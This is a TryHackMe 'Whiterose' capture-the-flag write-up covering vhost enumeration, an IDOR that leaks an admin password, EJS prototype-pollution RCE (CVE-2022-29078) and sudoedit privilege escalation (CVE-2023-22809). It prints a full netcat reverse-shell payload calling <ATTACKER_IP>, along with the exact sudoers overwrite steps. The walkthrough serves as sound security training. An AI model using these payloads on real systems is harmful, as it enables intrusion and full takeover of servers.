# 🌹 Whiterose

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/whiterose)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)]()
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)]()

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `cyprusbank.thm` / `admin.cyprusbank.thm` |
| **OS** | Ubuntu (nginx 1.14.0) |
| **Attack Surface** | IDOR → credential leak, EJS prototype pollution RCE |
| **Privesc** | CVE-2023-22809 sudoedit arbitrary file write → `/etc/sudoers` → root |

Whiterose starts with vhost enumeration to surface an Express/EJS admin panel, uses credentials provided on the room page to log in as a low-privilege user, exploits an IDOR in the messages endpoint to leak an admin password, then achieves RCE via a prototype pollution bug in EJS's `outputFunctionName` option (CVE-2022-29078). Privilege escalation abuses a `sudoedit` path traversal bug (CVE-2023-22809) in sudo 1.9.12p1 to overwrite `/etc/sudoers` and gain full root.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 cyprusbank.thm -oA cyprusbank-tcp
sudo nmap -sU -vv cyprusbank.thm -oA cyprusbank-udp
```

```
22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http  nginx 1.14.0 (Ubuntu)

UDP: 68/udp open|filtered dhcpc
```

Two TCP ports. Nothing interesting on UDP.

### Directory Bruteforce

```bash
ffuf -u http://cyprusbank.thm/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic
ffuf -u http://cyprusbank.thm/FUZZ -w ./Web-Content/raft-medium-files.txt -ic
ffuf -u http://cyprusbank.thm/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic
```

Nothing useful on the base domain — only `index.html` resolves. Dead end on directories.

### Virtual Host Enumeration

```bash
ffuf -u http://cyprusbank.thm/ -H "Host: FUZZ.cyprusbank.thm" \
  -w ./SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ic -fw 1
```

```
www     [Status: 200, Size: 252]
admin   [Status: 302, Size: 28]
```

`admin.cyprusbank.thm` redirects — that's the target. Added both to `/etc/hosts`.

---

## 💀 Initial Access

### Login — Olivia Cortez (low-privilege)

Credentials are provided on the room page: `Olivia Cortez:olivi8`. Logging in grants access to the admin panel but with limited visibility — the customer list is readable, but settings and full message history are not.

```http
POST /login HTTP/1.1
Host: admin.cyprusbank.thm

username=Olivia+Cortez&password=olivi8
```

```http
HTTP/1.1 302 Found
Location: /
```

### IDOR — Message Endpoint → Admin Password

The `/messages/` endpoint takes a `c` parameter as a counter with no authorisation check on the value. Iterating upward leaks other users' conversations.

```
GET /messages/?c=1   → Jemmy Laurel chatter, nothing useful
GET /messages/?c=8   → Gayle Bev leaks her own password in plaintext
```

```
Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
```

### Login — Gayle Bev (admin)

```http
POST /login HTTP/1.1
Host: admin.cyprusbank.thm

username=Gayle+Bev&password=p%7E%5DP%405%216%3Brs558%3Aq
```

```http
HTTP/1.1 302 Found
Location: /
```

Gayle has access to the `/settings` endpoint. This is where things get interesting.

### EJS Prototype Pollution RCE (CVE-2022-29078)

Posting a bare `name` to `/settings` with no `password` field produces a verbose 500 error leaking the full stack trace:

```http
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm

name=fff
```

```
ReferenceError: /home/web/app/views/settings.ejs:14
password is not defined
  at /home/web/app/node_modules/ejs/lib/ejs.js:692:17
  at /home/web/app/routes/settings.js:27:7
```

The app is Node.js + Express + EJS. EJS versions before 3.1.7 pass render options directly to the template engine without sanitisation, allowing `settings[view options][outputFunctionName]` to inject arbitrary JavaScript that executes during template compilation.

Payload — mkfifo netcat reverse shell, injected via `execSync`:

```http
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Type: application/x-www-form-urlencoded

name=foo&settings[view options][outputFunctionName]=x;return process.mainModule.require('child_process').execSync('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20<ATTACKER_IP>%204444%20%3E%2Ftmp%2Ff').toString()//
```

```bash
nc -nlvp 4444
```

```
connect to [<ATTACKER_IP>] from (UNKNOWN) [10.112.139.191] 40534
sh: 0: can't access tty; job control turned off
$
```

### Shell Stabilisation

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
stty rows 92 cols 110
export TERM=xterm
```

```
web@cyprusbank:~/app$ id
uid=1001(web) gid=1001(web) groups=1001(web)
```

### User Flag

```bash
cat /home/web/user.txt
```

```
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```

---

## 🔁 Privilege Escalation — web → root

### sudo Enumeration

```bash
sudo -l
```

```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Looks scoped. Check the sudo version:

```bash
sudo --version
```

```
Sudo version 1.9.12p1
```

### CVE-2023-22809 — sudoedit Arbitrary File Write

sudo 1.9.12p1 is vulnerable to CVE-2023-22809. When `sudoedit` is invoked, it honours the `EDITOR` environment variable and passes extra arguments after `--` directly to the editor. Because `env_keep` does not scrub `EDITOR`, an attacker can set:

```bash
export EDITOR="vim -- /etc/sudoers"
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

`sudoedit` opens both the authorised file *and* `/etc/sudoers` in `vim`. Appending a wildcard rule:

```
web ALL=(root) NOPASSWD: ALL
```

Save and quit. Verify:

```bash
sudo -l
```

```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: ALL
```

```bash
sudo su
```

```
root@cyprusbank:~# cat root.txt
THM{4nd_uR_p4ck4g3s}
```

---

## 🗺️ Attack Chain

```
[Port Scan]
    22/tcp SSH, 80/tcp nginx
          │
          ▼
[vHost Enumeration]
    admin.cyprusbank.thm → Express/EJS admin panel
          │
          ▼
[Login — Olivia Cortez:olivi8]
    low-priv access → customer list visible
          │
          ▼
[IDOR — /messages/?c=8]
    Gayle Bev leaks plaintext password → p~]P@5!6;rs558:q
          │
          ▼
[Login — Gayle Bev]
    admin access → /settings endpoint unlocked
          │
          ▼
[EJS Prototype Pollution — CVE-2022-29078]
    settings[view options][outputFunctionName] → execSync → mkfifo reverse shell → web
          │
          ▼
[sudoedit — CVE-2023-22809]
    EDITOR="vim -- /etc/sudoers" → arbitrary file write → NOPASSWD: ALL → root
```

---

## 📌 Key Takeaways

* IDOR in numeric counters is still stupidly common — always iterate any `?id=`, `?c=`, `?page=` parameter after authenticating
* EJS's `outputFunctionName` option is an RCE primitive if user-controlled input reaches render options — CVE-2022-29078 affects EJS < 3.1.7; pin your deps
* sudoedit's CVE-2023-22809 is a clean, reliable privilege escalation when the sudo version is ≤ 1.9.12p1 and any `sudoedit` rule exists — check it immediately on any box with a scoped `sudoedit` entry
* Verbose 500 errors leaking stack traces with full filesystem paths are a gift — always poke error states before looking for anything more complex
* `env_keep` in sudoers is often configured sloppily; attacker-controlled env vars surviving into privileged contexts are a classic foothold

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Virtual host and directory enumeration |
| Burp Suite | IDOR on /messages/ endpoint, EJS RCE payload delivery |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilisation (pty.spawn) |
| `sudoedit` | CVE-2023-22809 arbitrary file write to /etc/sudoers |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `THM{4lways_upd4te_uR_d3p3nd3nc!3s}` |
| `root.txt` | `THM{4nd_uR_p4ck4g3s}` |
